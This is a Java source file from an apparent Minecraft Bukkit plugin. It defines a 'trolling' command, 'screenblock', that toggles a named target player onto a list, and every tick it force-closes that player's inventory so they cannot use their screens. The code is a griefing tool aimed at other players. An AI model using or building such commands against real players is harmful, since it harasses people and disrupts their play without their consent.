package de.garkolym.cp.commands.impl;

import de.garkolym.cp.Start;
import de.garkolym.cp.commands.Category;
import de.garkolym.cp.commands.CommandBase;
import org.bukkit.Bukkit;
import org.bukkit.entity.Player;

import java.util.ArrayList;

public class Command_ScreenBlock extends CommandBase {

    private final ArrayList<Player> players = new ArrayList<>();

    public Command_ScreenBlock() {
        super("screenblock", "<Spieler>", Category.TROLLING);
    }

    public void execute(String[] args, Player p) {
        if (args.length == 2) {
            try {
                Player vic = Bukkit.getPlayer(args[1]);
                if (!this.players.contains(vic)) {
                    this.players.add(vic);
                    p.sendMessage(Start.INSTANCE.chatPrefix + "Sein Screen wurde geblockt!");
                } else {
                    this.players.remove(vic);
                    p.sendMessage(Start.INSTANCE.chatPrefix + "Sein Screen wurde entblockt!");
                }
            } catch (Exception ignored) {
            }
        }
    }

    public void onTick() {
        for (Player user : this.players) {
            user.closeInventory();
        }
    }

}
